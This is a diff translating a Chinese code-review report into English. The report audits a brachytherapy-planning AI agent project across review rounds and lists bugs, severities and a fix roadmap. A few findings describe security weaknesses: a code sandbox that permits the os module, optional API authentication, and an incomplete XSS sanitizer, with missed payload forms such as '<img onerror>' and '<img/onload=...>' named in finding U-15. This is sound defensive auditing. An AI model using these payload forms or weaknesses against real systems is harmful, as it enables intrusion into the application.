-| V-21 | brachybot.py | **无 `if __name__ == "__main__"` 保护的子模块** — `_run_chat` 和 `_run_server` 直接调用，无延迟导入保护。 |
-| V-22 | requirements.txt | **torch 无 CUDA 版本区分** — `torch>=2.0.0` 不区分 CPU/CUDA 版本，安装可能缺少 GPU 支持。 |
-| V-23 | web/server.py:160-168 | **_allowed_roots 包含 /home** — 路径验证允许读取 /home 下任何用户目录，范围过大。 |
+| V-21 | brachybot.py | **Submodules without `if __name__ == "__main__"` protection** — `_run_chat` and `_run_server` are called directly with no deferred import protection. |
+| V-22 | requirements.txt | **torch does not distinguish CUDA versions** — `torch>=2.0.0` does not distinguish CPU/CUDA versions, so the installation may lack GPU support. |
+| V-23 | web/server.py:160-168 | **_allowed_roots includes /home** — path validation allows reading any user directory under /home, too broad a scope. |
 
-### 第五轮问题统计
+### Round 5 Issue Statistics
 
-| 严重度 | 数量 | 关键发现 |
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| 🔴 Critical | 2 | sys.path 滥用（53处）、运行时路径污染 |
-| 🟠 High | 5 | 无包管理、认证可选、上传限制、全局 agent、成功判断 |
-| 🟡 Medium | 5 | Prompt 版本、TaskManager 泄漏、compact 限制、记忆加密、沙箱绕过 |
-| 🔵 Low | 3 | 导入保护、torch 版本、路径范围 |
-| **总计** | **15** | |
+| 🔴 Critical | 2 | sys.path abuse (53 places), runtime path pollution |
+| 🟠 High | 5 | no package management, optional auth, upload limit, global agent, success check |
+| 🟡 Medium | 5 | Prompt versioning, TaskManager leak, compact limit, memory encryption, sandbox bypass |
+| 🔵 Low | 3 | import protection, torch version, path scope |
+| **Total** | **15** | |
 
-### 第五轮核实矩阵
+### Round 5 Verification Matrix
 
-| # | 问题 | 核实结果 | 动作 |
+| # | Issue | Verification Result | Action |
 |---|------|----------|------|
-| V-09 | sys.path.insert 53处 | ✅ 确认 — grep 验证 | 🔴 待修复 |
-| V-10 | tool_creator 动态 sys.path | ✅ 确认 — 并发污染风险 | 🟠 待修复 |
-| V-11 | 无 pyproject.toml | ✅ 确认 — 文件不存在 | 🔴 待修复 |
-| V-12 | API Key 可选 | ✅ 确认 — 逻辑正确但不安全 | 🟠 待评估 |
-| V-13 | 500MB 上传 | ✅ 确认 — 过于宽松 | 🟠 待修复 |
-| V-14 | _global_agent | ✅ 确认 — 多 session 共享 | 🟠 待修复 |
-| V-15 | 成功判断 | ✅ 确认 — 正则匹配过于宽松 | 🟡 待修复 |
-| V-16 | Prompt 版本 | ✅ 确认 — 无版本管理 | 🟡 建议改进 |
-| V-17 | TaskManager TTL | ✅ 已确认 (T3-23) | 🟡 待修复 |
-| V-18 | compact 6条 | ✅ 确认 — 临床工作流可能不够 | 🟡 待评估 |
-| V-19 | 记忆加密 | ✅ 确认 — 明文 JSON | 🟡 合规风险 |
-| V-20 | os 在 ALLOWED_MODULES | ✅ 确认 — 沙箱绕过 | 🟠 待修复 |
-| V-21 | 导入保护 | ⚪ 低影响 | 🔵 可选 |
-| V-22 | torch 版本 | ⚪ 低影响 | 🔵 可选 |
-| V-23 | /home 路径范围 | ✅ 确认 — 范围过大 | 🟡 待修复 |
+| V-09 | sys.path.insert 53 places | ✅ Confirmed — grep verified | 🔴 To be fixed |
+| V-10 | tool_creator dynamic sys.path | ✅ Confirmed — concurrent pollution risk | 🟠 To be fixed |
+| V-11 | No pyproject.toml | ✅ Confirmed — file does not exist | 🔴 To be fixed |
+| V-12 | API Key optional | ✅ Confirmed — logic correct but insecure | 🟠 To be assessed |
+| V-13 | 500MB upload | ✅ Confirmed — too permissive | 🟠 To be fixed |
+| V-14 | _global_agent | ✅ Confirmed — shared across sessions | 🟠 To be fixed |
+| V-15 | Success check | ✅ Confirmed — regex match too permissive | 🟡 To be fixed |
+| V-16 | Prompt versions | ✅ Confirmed — no version management | 🟡 Improvement suggested |
+| V-17 | TaskManager TTL | ✅ Confirmed (T3-23) | 🟡 To be fixed |
+| V-18 | compact 6 messages | ✅ Confirmed — may be insufficient for clinical workflows | 🟡 To be assessed |
+| V-19 | Memory encryption | ✅ Confirmed — plaintext JSON | 🟡 Compliance risk |
+| V-20 | os in ALLOWED_MODULES | ✅ Confirmed — sandbox bypass | 🟠 To be fixed |
+| V-21 | Import protection | ⚪ Low impact | 🔵 Optional |
+| V-22 | torch version | ⚪ Low impact | 🔵 Optional |
+| V-23 | /home path scope | ✅ Confirmed — too broad | 🟡 To be fixed |
 
-**已核实 15 项**：13 个确认为真问题，2 个低影响可选改进。
+**15 items verified**: 13 confirmed as real issues, 2 low-impact optional improvements.
 
 ---
 
-### 五轮累计统计
+### Five-Round Cumulative Statistics
 
-| 轮次 | Critical | High | Medium | Low | 总计 |
+| Round | Critical | High | Medium | Low | Total |
 |------|----------|------|--------|-----|------|
-| 第一轮 | 12 | 18 | 24 | 15 | 69 |
-| 第二轮 | 8 | 14 | 14 | 2 | 38 |
-| 第三轮 | 6 | 16 | 18 | 12 | 52 |
-| 第四轮 | — | — | — | — | (修复轮) |
-| 第五轮 | 2 | 5 | 5 | 3 | 15 |
-| **累计** | **28** | **53** | **61** | **32** | **174** |
-| 已修复 | 28 | 5 | 3 | 0 | **36** |
-| 待修复 | 0 | 48 | 58 | 32 | **138** |
+| Round 1 | 12 | 18 | 24 | 15 | 69 |
+| Round 2 | 8 | 14 | 14 | 2 | 38 |
+| Round 3 | 6 | 16 | 18 | 12 | 52 |
+| Round 4 | — | — | — | — | (fix round) |
+| Round 5 | 2 | 5 | 5 | 3 | 15 |
+| **Cumulative** | **28** | **53** | **61** | **32** | **174** |
+| Fixed | 28 | 5 | 3 | 0 | **36** |
+| To be fixed | 0 | 48 | 58 | 32 | **138** |
 
-### 五轮最高优先级修复路线图
+### Five-Round Highest-Priority Fix Roadmap
 
-| 优先级 | 问题 | 修复方案 | 状态 |
+| Priority | Issue | Fix Plan | Status |
 |--------|------|----------|------|
-| **P0** | 无 pyproject.toml (V-11) | 创建 pyproject.toml + 消除 sys.path.insert | 待修复 |
-| **P0** | sys.path 滥用 53处 (V-09) | 配合 pyproject.toml 逐步清理 | 待修复 |
-| **P0** | Gemini 丢 tool calls (T3-01) | 实现 Gemini tool call 解析 | ✅ 已修复 |
-| **P0** | MCTS UCB1 损坏 (T3-02) | 调用 `_get_parent_visits()` | ✅ 已修复 |
-| **P0** | 剂量等高线单位 (T3-03) | 统一 Gy/归一化单位 | ✅ 已修复 |
-| **P0** | RL _reward_core 崩溃 (T3-05) | None 保护 + numpy 回退 | ✅ 已修复 |
-| **P1** | _global_agent 共享状态 (V-14) | 改用依赖注入或 session-scoped 引用 | 待修复 |
-| **P1** | API Key 默认禁用 (V-12) | 默认启用认证或强制环境变量 | 待评估 |
-| **P1** | 代码执行沙箱 (T3-15/V-20) | 移除 os 到 ALLOWED_MODULES，限制 __import__ | 待修复 |
-| **P1** | XSS 残留 (T3-06) | 7 处 innerHTML 加 _sanitizeHtml | ⏭️ 需 Playwright 验证 |
-| **P2** | 会话线程安全 (T3-10) | 添加 threading.Lock | 待修复 |
-| **P2** | AgentMemory 泄漏 (T3-07) | 添加 TTL + 大小限制 | 待修复 |
-| **P2** | TaskManager TTL (V-17) | 添加任务过期清理 | 待修复 |
-| **P2** | 记忆数据加密 (V-19) | AES-256 加密 + 访问控制 | 待修复 |
-| **P3** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |
+| **P0** | No pyproject.toml (V-11) | Create pyproject.toml + eliminate sys.path.insert | To be fixed |
+| **P0** | sys.path abuse 53 places (V-09) | Clean up incrementally alongside pyproject.toml | To be fixed |
+| **P0** | Gemini discards tool calls (T3-01) | Implement Gemini tool call parsing | ✅ Fixed |
+| **P0** | MCTS UCB1 broken (T3-02) | Call `_get_parent_visits()` | ✅ Fixed |
+| **P0** | Dose contour units (T3-03) | Unify Gy/normalized units | ✅ Fixed |
+| **P0** | RL _reward_core crash (T3-05) | None protection + numpy fallback | ✅ Fixed |
+| **P1** | _global_agent shared state (V-14) | Switch to dependency injection or session-scoped references | To be fixed |
+| **P1** | API Key disabled by default (V-12) | Enable auth by default or enforce the environment variable | To be assessed |
+| **P1** | Code execution sandbox (T3-15/V-20) | Remove os from ALLOWED_MODULES, restrict __import__ | To be fixed |
+| **P1** | XSS residual (T3-06) | Add _sanitizeHtml to 7 innerHTML usages | ⏭️ Needs Playwright verification |
+| **P2** | Session thread safety (T3-10) | Add threading.Lock | To be fixed |
+| **P2** | AgentMemory leak (T3-07) | Add TTL + size limit | To be fixed |
+| **P2** | TaskManager TTL (V-17) | Add task expiration cleanup | To be fixed |
+| **P2** | Memory data encryption (V-19) | AES-256 encryption + access control | To be fixed |
+| **P3** | Dockerization (T3-21) | Dockerfile + docker-compose | To be fixed |
 
 ---
 
-**第五轮审查完成时间**: 2026-06-28  
-**审查人**: MiMo Code Agent (独立深度审查)  
-**审查覆盖**: 核心文件逐行审查 + 全局 grep 验证  
-**累计审查**: 5 轮 / 174 个问题 / 36 个已修复
+**Round 5 Review Completion Time**: 2026-06-28  
+**Reviewer**: MiMo Code Agent (independent deep review)  
+**Review Coverage**: core file line-by-line review + global grep verification  
+**Cumulative Review**: 5 rounds / 174 issues / 36 fixed
 
 ---
 
-## 第六轮：未覆盖模块深度审查 (2026-06-28)
+## Round 6: Deep Review of Uncovered Modules (2026-06-28)
 
-> 3 个并行 Agent 对前 5 轮未深度覆盖的模块进行全面审查：communication/、quality/、clinical_kb/、brain/providers/（14 个文件）、brain/knowledge/、brain/integration/、brain/deciders/、brain/execution/、brain/prompts/、skills/markdown/、skills/markdown_loader.py、memory/smart_context.py、memory/context_optimizer.py、memory/user_profile.py、memory/preference_store.py、web/app/static/js/、web/app/static/css/、config/default_params.json、scripts/。
+> 3 parallel Agents performed a comprehensive review of modules not deeply covered in the first 5 rounds: communication/, quality/, clinical_kb/, brain/providers/ (14 files), brain/knowledge/, brain/integration/, brain/deciders/, brain/execution/, brain/prompts/, skills/markdown/, skills/markdown_loader.py, memory/smart_context.py, memory/context_optimizer.py, memory/user_profile.py, memory/preference_store.py, web/app/static/js/, web/app/static/css/, config/default_params.json, scripts/.
 
-### 审查统计
+### Review Statistics
 
-| 维度 | Agent 覆盖 | 新发现 |
+| Dimension | Agent Coverage | New Findings |
 |------|-----------|--------|
-| communication/ + quality/ + clinical_kb/ + config/ + scripts/ | 5 文件 ~950 行 | 14 |
-| brain/providers/ + knowledge/ + integration/ + deciders/ + execution/ | 20+ 文件 ~6000 行 | 35 |
-| skills/ + memory/ (smart_context, context_optimizer, user_profile, preference_store) + frontend CSS/JS | 15+ 文件 ~5000 行 | 36 |
-| **总计** | **40+ 文件 ~12000 行** | **85** |
+| communication/ + quality/ + clinical_kb/ + config/ + scripts/ | 5 files ~950 lines | 14 |
+| brain/providers/ + knowledge/ + integration/ + deciders/ + execution/ | 20+ files ~6000 lines | 35 |
+| skills/ + memory/ (smart_context, context_optimizer, user_profile, preference_store) + frontend CSS/JS | 15+ files ~5000 lines | 36 |
+| **Total** | **40+ files ~12000 lines** | **85** |
 
 ---
 
-### 🔴 Critical — 新发现
+### 🔴 Critical — New Findings
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| U-01 | quality/quality_gate.py | 332-357 | **质量门永远不拒绝** — `passed` 始终为 `True`。即使 safety_guardian 返回 `"reject"`，最终结果仍是 `"conditional"` + `passed=True`。`_reject_count` 永远无法递增。整个质量门机制形同虚设，临床危险输出无法被拦截。 |
-| U-02 | brain/providers/ | 多文件 | **14 个 Provider tool call 格式不一致** — OpenAI/local/generic 返回 `{"id", "name", "arguments"}`（扁平），qwen/deepseek/kimi/glm/groq/grok/tencent/mimo 返回 `{"function": {"name", "arguments"}}`（嵌套）。任何消费代码假设单一格式都会崩溃。 |
-| U-03 | brain/providers/minimax_llm.py | 93 | **MiniMax RateLimitError NameError** — `openai` 在 try 块内导入（line 64），如果导入失败，line 93 的 `except openai.RateLimitError` 引用未定义变量，导致 `NameError` 崩溃。 |
+| U-01 | quality/quality_gate.py | 332-357 | **Quality gate never rejects** — `passed` is always `True`. Even if safety_guardian returns `"reject"`, the final result is still `"conditional"` + `passed=True`. `_reject_count` can never increment. The entire quality gate mechanism is ineffective and clinically dangerous output cannot be intercepted. |
+| U-02 | brain/providers/ | multiple files | **tool call format inconsistent across 14 providers** — OpenAI/local/generic return `{"id", "name", "arguments"}` (flat), while qwen/deepseek/kimi/glm/groq/grok/tencent/mimo return `{"function": {"name", "arguments"}}` (nested). Any consuming code that assumes a single format will crash. |
+| U-03 | brain/providers/minimax_llm.py | 93 | **MiniMax RateLimitError NameError** — `openai` is imported inside the try block (line 64); if the import fails, the `except openai.RateLimitError` at line 93 references an undefined variable, causing a `NameError` crash. |
 
-### 🟠 High — 新发现
+### 🟠 High — New Findings
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| U-04 | communication/message_bus.py | 60 | **`List[any]` 类型注解错误** — 小写 `any` 在 Python 3.9+ 是 `TypeError`，应为 `List[Any]`。 |
-| U-05 | communication/message_bus.py | 60 | **_history 无界增长** — 消息历史列表无限追加，无 TTL、无驱逐，长时间运行 OOM。 |
-| U-06 | communication/message_bus.py | 66-87 | **重复 Handler 调用** — 订阅者同时匹配 MessageType 和 AgentRole 时，同一消息被处理两次。在临床系统中可能导致治疗计划双重执行。 |
-| U-07 | communication/message_bus.py | 103 | **废弃 API `asyncio.get_event_loop()`** — Python 3.12+ 会抛 RuntimeError，应改用 `get_running_loop()`。 |
-| U-08 | quality/quality_gate.py | 108-116 | **无 Agent 注册 = 自动通过** — 如果 agents 注册失败（ImportError），所有输出跳过审查直接通过。应改为 fail-closed。 |
-| U-09 | brain/providers/openai_llm.py | 49,57,87 | **max_retries 存储但未使用** — 参数存储但未传给 OpenAI 客户端，也未实现重试循环。 |
-| U-10 | brain/providers/anthropic_llm.py | 368 | **Streaming fallback 类型不一致** — 异常处理 yield 原始字符串，正常路径 yield dict，消费者会崩溃。 |
-| U-11 | brain/providers/local_llm.py | 41 | **双 `/v1` URL** — base_url 默认 `"http://localhost:8000/v1"`，请求构建 `f"{base_url}/v1/models"` 产生 `/v1/v1/models`。 |
-| U-12 | brain/providers/openrouter_llm.py | 292-302 | **tool_calls arguments 未解析 JSON** — 非流式路径保持原始字符串，流式路径用 `json.loads()`，类型不一致。 |
-| U-13 | brain/deciders/quality_decider.py | 21,109,111 | **满分 80 而非文档声称的 100** — coverage(25)+homogeneity(25)+OAR(30)=80，但 `>=80` 才 ACCEPTABLE，要求完美分数。 |
-| U-14 | brain/execution/case_executor.py | 172-180,231 | **output_type 丢失** — StepResult 无 output_type 字段，定量步骤的最终指标被静默丢弃。 |
-| U-15 | web/app/index.html | 5964-5971 | **XSS sanitizer 不完整** — 未过滤 `data:` URL、`<img onerror>`、无空格事件处理器 `<img/onload=...>`。 |
-| U-16 | brain/providers/ | 8 个文件 | **kwargs 覆盖显式参数** — qwen/deepseek/kimi/glm/groq/grok/tencent/mimo 的 `chat_kwargs.update(kwargs)` 会覆盖已设置的 model/messages/temperature。 |
-| U-17 | brain/providers/ | 8 个文件 | **latency_ms 硬编码 0.0** — deepseek/kimi/glm/groq/grok/minimax/tencent/mimo 不测量实际延迟。 |
+| U-04 | communication/message_bus.py | 60 | **`List[any]` type annotation error** — lowercase `any` is a `TypeError` in Python 3.9+; should be `List[Any]`. |
+| U-05 | communication/message_bus.py | 60 | **_history unbounded growth** — the message history list appends without limit, with no TTL or eviction, causing OOM on long runs. |
+| U-06 | communication/message_bus.py | 66-87 | **Duplicate Handler invocation** — when a subscriber matches both MessageType and AgentRole, the same message is processed twice. In a clinical system this may cause double execution of a treatment plan. |
+| U-07 | communication/message_bus.py | 103 | **Deprecated API `asyncio.get_event_loop()`** — Python 3.12+ raises RuntimeError; should use `get_running_loop()` instead. |
+| U-08 | quality/quality_gate.py | 108-116 | **No Agent registered = automatic pass** — if agents registration fails (ImportError), all output skips review and passes directly. Should be changed to fail-closed. |
+| U-09 | brain/providers/openai_llm.py | 49,57,87 | **max_retries stored but unused** — the parameter is stored but never passed to the OpenAI client, and no retry loop is implemented. |
+| U-10 | brain/providers/anthropic_llm.py | 368 | **Streaming fallback type inconsistency** — the exception handler yields a raw string while the normal path yields a dict; consumers will crash. |
+| U-11 | brain/providers/local_llm.py | 41 | **Double `/v1` URL** — base_url defaults to `"http://localhost:8000/v1"`, and request construction `f"{base_url}/v1/models"` produces `/v1/v1/models`. |
+| U-12 | brain/providers/openrouter_llm.py | 292-302 | **tool_calls arguments not JSON-parsed** — the non-streaming path keeps the raw string while the streaming path uses `json.loads()`; types are inconsistent. |
+| U-13 | brain/deciders/quality_decider.py | 21,109,111 | **Maximum score is 80, not the documented 100** — coverage(25)+homogeneity(25)+OAR(30)=80, yet only `>=80` is ACCEPTABLE, requiring a perfect score. |
+| U-14 | brain/execution/case_executor.py | 172-180,231 | **output_type lost** — StepResult has no output_type field, so the final metrics of quantitative steps are silently discarded. |
+| U-15 | web/app/index.html | 5964-5971 | **XSS sanitizer incomplete** — does not filter `data:` URLs, `<img onerror>`, or whitespace-free event handlers `<img/onload=...>`. |
+| U-16 | brain/providers/ | 8 files | **kwargs override explicit parameters** — `chat_kwargs.update(kwargs)` in qwen/deepseek/kimi/glm/groq/grok/tencent/mimo overrides the already-set model/messages/temperature. |
+| U-17 | brain/providers/ | 8 files | **latency_ms hardcoded 0.0** — deepseek/kimi/glm/groq/grok/minimax/tencent/mimo do not measure actual latency. |
 
-### 🟡 Medium — 新发现
+### 🟡 Medium — New Findings
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| U-18 | communication/protocol.py | 57 | **UUID 截断碰撞风险** — `uuid4()[:8]` 仅 32 位，~77000 消息后碰撞概率 >50%。 |
-| U-19 | communication/protocol.py | 109 | **confidence/score 无范围验证** — 0.0-1.0 和 0-10 范围外的值静默传播。 |
-| U-20 | communication/message_bus.py | 91-117 | **Pending response 竞态** — `_pending_responses` 无锁保护，并发 request 可能解析错误的 Future。 |
-| U-21 | communication/message_bus.py | 113-117 | **超时消息丢失** — 超时后 Future 移除但未取消，慢 Handler 的 respond() 静默丢弃。 |
-| U-22 | quality/quality_gate.py | 244-247 | **异常吞噬** — `asyncio.gather` 失败时结果置空列表，触发"无审查"通过路径。 |
-| U-23 | quality/quality_gate.py | 160-163 | **Fallback 到所有 Agent** — 无特定 Agent 时使用全部注册 Agent，不相关 Agent 可能产生误导决策。 |
-| U-24 | brain/knowledge/rag.py | 47 | **朴素关键词检索** — 空格分词匹配单个 token，"dose volume histogram" 被拆分为 3 个独立匹配。 |
-| U-25 | brain/knowledge/rag.py | 40-48 | **每次查询重新读取 JSON** — knowledge_base.json 每次非缓存查询都从磁盘读取。 |
-| U-26 | brain/knowledge/rag.py | 123-130 | **线程不安全单例 `_rag_instance`** — 多线程 Flask 服务器可能创建多个实例。 |
-| U-27 | brain/integration/enhanced_agent.py | 129 | **extract_facts 空上下文** — 始终传递空 `{}` 而非实际任务上下文，降低事实提取质量。 |
-| U-28 | brain/execution/plan_executor.py | 129-131 | **未解析变量返回 None** — 上下文中不存在的变量返回 None，下游工具收到晦涩错误。 |
-| U-29 | brain/execution/case_executor.py | 104-123 | **循环依赖静默跳过** — 有循环依赖的步骤被跳过，无警告或错误。 |
-| U-30 | brain/deciders/planner_decider.py | 121-127 | **_safe_json_parse 返回类型不一致** — LLM 返回单步 dict 时，后续迭代字符串键导致 TypeError。 |
-| U-31 | brain/deciders/clinical_decider.py | 187 | **value=0 被误判为 None** — `it.get("value") or it.get("judgment", 0)` 中 0 是 falsy，跳到 judgment。 |
-| U-32 | memory/smart_context.py | 171 | **中文 Token 估算严重偏差** — `len(text)//4` 对中文估算仅为实际的 1/4，导致上下文预算溢出。 |
-| U-33 | memory/user_profile.py | 130,141 | **偏好值比较逻辑错误** — 比较 stored value 与 preference name 而非实际观测值，仅因巧合正确。 |
-| U-34 | memory/user_profile.py | 191 | **大小写敏感关键词匹配** — `"CNN"` 不匹配 `"cnn"`，`_detect_dose_preference` 永远不会触发。 |
-| U-35 | memory/user_profile.py | 163-168 | **部分比较未调用 lower()** — `"planning" in user_input` 不匹配 "Planning"。 |
-| U-36 | memory/context_optimizer.py | 218-225 | **未知 segment 类型静默丢弃** — 新增类型不会出现在输出中。 |
-| U-37 | memory/context_optimizer.py | 117-126 | **原地排序破坏输入** — sort() 修改调用者的列表。 |
-| U-38 | skills/markdown/rl_planning.md | 14 | **引用不存在的工具 `seed_planning_rl`** — 应为 `seed_planning`。 |
-| U-39 | skills/markdown/rl_planning.md | 9 | **触发词 "complex" 过于宽泛** — 任何含 "complex" 的医疗请求都会触发 RL 规划。 |
-| U-40 | skills/markdown/dose_evaluation.md | 12 | **引用不存在的工具 `oar_constraint_checker`** |
-| U-41 | web/app/index.html | 1780 | **CSS 孤立声明** — 块外的 CSS 属性被浏览器忽略，复制粘贴错误。 |
-| U-42 | web/app/index.html | 2531-2533 | **`.metric-card.warn` 边框被覆盖** — 透明边框覆盖了琥珀色边框。 |
-| U-43 | web/app/index.html | 6749,7016 | **setInterval 定时器泄漏** — 容器清空时未清理定时器。 |
-| U-44 | web/app/index.html | 4552+ | **缺少 aria-label** — 纯图标按钮无无障碍标签。 |
-| U-45 | config/default_params.json | 7 | **seed_avr_dose 单位不明** — 50 是 Gy、cGy 还是 0-255 归一化？ |
-| U-46 | config/default_params.json | 45 | **相对路径 dose_model_path** — 依赖 CWD，不同启动目录会找不到模型。 |
-| U-47 | brain/providers/ | 8 个文件 | **冗余名称前缀** — `qwen-qwen-plus`、`deepseek-deepseek-v4-flash` 等。 |
-| U-48 | brain/providers/anthropic_llm.py | 79-83 | **多 system 消息静默丢弃** — 只保留最后一个。 |
-| U-49 | brain/providers/openrouter_llm.py | 272 | **修改调用者 kwargs** — `kwargs.pop()` 产生副作用。 |
-| U-50 | brain/knowledge/ui_knowledge.json | 265 | **复制粘贴 bug** — trigger `"segment" or "segment"` 重复。 |
-| U-51 | memory/preference_store.py | 148-171 | **apply_to_tool_params 回退逻辑** — 学习偏好键名不匹配时回退到默认值。 |
+| U-18 | communication/protocol.py | 57 | **UUID truncation collision risk** — `uuid4()[:8]` is only 32 bits; collision probability exceeds 50% after ~77000 messages. |
+| U-19 | communication/protocol.py | 109 | **confidence/score have no range validation** — values outside 0.0-1.0 and 0-10 propagate silently. |
+| U-20 | communication/message_bus.py | 91-117 | **Pending response race** — `_pending_responses` has no lock protection; concurrent requests may resolve the wrong Future. |
+| U-21 | communication/message_bus.py | 113-117 | **Timed-out message lost** — after timeout the Future is removed but not cancelled; a slow Handler's respond() is silently dropped. |
+| U-22 | quality/quality_gate.py | 244-247 | **Exception swallowing** — when `asyncio.gather` fails, the result is set to an empty list, triggering the "no review" pass path. |
+| U-23 | quality/quality_gate.py | 160-163 | **Fallback to all Agents** — with no specific Agent, all registered Agents are used, and irrelevant Agents may produce misleading decisions. |
+| U-24 | brain/knowledge/rag.py | 47 | **Naive keyword retrieval** — whitespace tokenization matches single tokens; "dose volume histogram" is split into 3 independent matches. |
+| U-25 | brain/knowledge/rag.py | 40-48 | **Re-reads JSON on every query** — knowledge_base.json is read from disk on every non-cached query. |
+| U-26 | brain/knowledge/rag.py | 123-130 | **Thread-unsafe singleton `_rag_instance`** — a multithreaded Flask server may create multiple instances. |
+| U-27 | brain/integration/enhanced_agent.py | 129 | **extract_facts empty context** — always passes an empty `{}` instead of the actual task context, reducing fact extraction quality. |
+| U-28 | brain/execution/plan_executor.py | 129-131 | **Unresolved variables return None** — variables missing from the context return None, and downstream tools receive obscure errors. |
+| U-29 | brain/execution/case_executor.py | 104-123 | **Circular dependencies silently skipped** — steps with circular dependencies are skipped with no warning or error. |
+| U-30 | brain/deciders/planner_decider.py | 121-127 | **_safe_json_parse return type inconsistent** — when the LLM returns a single-step dict, iterating string keys afterward causes a TypeError. |
+| U-31 | brain/deciders/clinical_decider.py | 187 | **value=0 misjudged as None** — in `it.get("value") or it.get("judgment", 0)`, 0 is falsy and jumps to judgment. |
+| U-32 | memory/smart_context.py | 171 | **Chinese token estimation severely off** — `len(text)//4` estimates Chinese at only 1/4 of the actual count, causing context budget overflow. |
+| U-33 | memory/user_profile.py | 130,141 | **Preference value comparison logic wrong** — compares the stored value with the preference name rather than the actual observed value; correct only by coincidence. |
+| U-34 | memory/user_profile.py | 191 | **Case-sensitive keyword matching** — `"CNN"` does not match `"cnn"`, so `_detect_dose_preference` never triggers. |
+| U-35 | memory/user_profile.py | 163-168 | **Some comparisons do not call lower()** — `"planning" in user_input` does not match "Planning". |
+| U-36 | memory/context_optimizer.py | 218-225 | **Unknown segment types silently dropped** — new types never appear in the output. |
+| U-37 | memory/context_optimizer.py | 117-126 | **In-place sort corrupts input** — sort() modifies the caller's list. |
+| U-38 | skills/markdown/rl_planning.md | 14 | **References a nonexistent tool `seed_planning_rl`** — should be `seed_planning`. |
+| U-39 | skills/markdown/rl_planning.md | 9 | **Trigger word "complex" too broad** — any medical request containing "complex" triggers RL planning. |
+| U-40 | skills/markdown/dose_evaluation.md | 12 | **References a nonexistent tool `oar_constraint_checker`** |
+| U-41 | web/app/index.html | 1780 | **Orphaned CSS declaration** — CSS properties outside a block are ignored by the browser; copy-paste error. |
+| U-42 | web/app/index.html | 2531-2533 | **`.metric-card.warn` border overridden** — a transparent border overrides the amber border. |
+| U-43 | web/app/index.html | 6749,7016 | **setInterval timer leak** — the timer is not cleared when the container is emptied. |
+| U-44 | web/app/index.html | 4552+ | **Missing aria-label** — icon-only buttons have no accessibility label. |
+| U-45 | config/default_params.json | 7 | **seed_avr_dose unit unclear** — is 50 Gy, cGy, or 0-255 normalized? |
+| U-46 | config/default_params.json | 45 | **Relative path dose_model_path** — depends on CWD; a different startup directory will not find the model. |
+| U-47 | brain/providers/ | 8 files | **Redundant name prefixes** — `qwen-qwen-plus`, `deepseek-deepseek-v4-flash`, etc. |
+| U-48 | brain/providers/anthropic_llm.py | 79-83 | **Multiple system messages silently dropped** — only the last is kept. |
+| U-49 | brain/providers/openrouter_llm.py | 272 | **Modifies caller kwargs** — `kwargs.pop()` produces a side effect. |
+| U-50 | brain/knowledge/ui_knowledge.json | 265 | **Copy-paste bug** — trigger `"segment" or "segment"` duplicated. |
+| U-51 | memory/preference_store.py | 148-171 | **apply_to_tool_params fallback logic** — falls back to defaults when the learned preference key does not match. |
 
-### 🔵 Low — 新发现
+### 🔵 Low — New Findings
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| U-52 | communication/protocol.py | 125 | **reviewer 类型不一致** — 应为 AgentRole 枚举而非 str。 |
-| U-53 | brain/providers/ | 10 个文件 | **10 个 Provider 无流式支持** — 仅 4/14 支持 streaming。 |
-| U-54 | brain/integration/enhanced_agent.py | 16 | **未使用的 `import sys`** |
-| U-55 | brain/integration/enhanced_agent.py | 148 | **脆弱的内部属性访问** — `agent.exp_memory.experiences` 直接访问。 |
-| U-56 | brain/execution/case_executor.py | 291-293 | **文件覆盖内存结果** — 输出文件存在时覆盖工具返回值。 |
-| U-57 | memory/smart_context.py | 200-235 | **重要性分数无界** — 多条件叠加可达 1.4，虽有 clamp 但 tool 消息与 system 消息同等重要。 |
-| U-58 | memory/smart_context.py | 403-411 | **O(n²) 复杂度** — `msg not in [list]` 每次线性扫描。 |
-| U-59 | memory/context_optimizer.py | 249 | **潜在除零** — total_budget=0 时 ZeroDivisionError。 |
-| U-60 | memory/user_profile.py | 96-114 | **save() 非原子写入** — 崩溃时文件截断。 |
-| U-61 | memory/preference_store.py | 220-221 | **default=str 静默转换** — 非序列化类型变为字符串。 |
-| U-62 | memory/preference_store.py | 208-209 | **KeyError 吞噬** — 异常时整个偏好文件重置为空。 |
-| U-63 | skills/markdown_loader.py | 154-164 | **全局 Loader 线程不安全** — 懒初始化无锁。 |
-| U-64 | skills/markdown_loader.py | 96-97 | **YAML 标量 triggers** — 字符串 triggers 会被逐字符迭代。 |
-| U-65 | skills/markdown_loader.py | 118 | **BOM 未处理** — UTF-8 BOM 导致 frontmatter 正则不匹配。 |
-| U-66 | scripts/nnunet_infer.py | 1-7 | **无输入验证/错误处理** — nnunetv2 未安装时 ImportError 无友好提示。 |
-| U-67 | scripts/nnunet_infer.py | 2 | **脆弱的参数解析** — `"-m" in sys.argv` 匹配任何含 -m 的参数。 |
-| U-68 | web/app/index.html | 5367-5370 | **escHtml 未转义单引号** — 在单引号属性中可能逃逸。 |
-| U-69 | brain/providers/openrouter_llm.py | 112-129 | **客户端非懒加载** — __init__ 中创建，API key 无效时构造失败。 |
-| U-70 | brain/providers/mini_max_llm.py | 62-102 | **_chat 可返回 None** — max_retries=0 时无 return 语句。 |
+| U-52 | communication/protocol.py | 125 | **reviewer type inconsistent** — should be the AgentRole enum rather than str. |
+| U-53 | brain/providers/ | 10 files | **10 providers lack streaming support** — only 4/14 support streaming. |
+| U-54 | brain/integration/enhanced_agent.py | 16 | **Unused `import sys`** |
+| U-55 | brain/integration/enhanced_agent.py | 148 | **Fragile internal attribute access** — direct access to `agent.exp_memory.experiences`. |
+| U-56 | brain/execution/case_executor.py | 291-293 | **File overwrites in-memory result** — overwrites the tool return value when an output file exists. |
+| U-57 | memory/smart_context.py | 200-235 | **Importance score unbounded** — stacking multiple conditions can reach 1.4; although clamped, tool messages rank equally with system messages. |
+| U-58 | memory/smart_context.py | 403-411 | **O(n²) complexity** — `msg not in [list]` does a linear scan each time. |
+| U-59 | memory/context_optimizer.py | 249 | **Potential division by zero** — ZeroDivisionError when total_budget=0. |
+| U-60 | memory/user_profile.py | 96-114 | **save() non-atomic write** — file truncation on crash. |
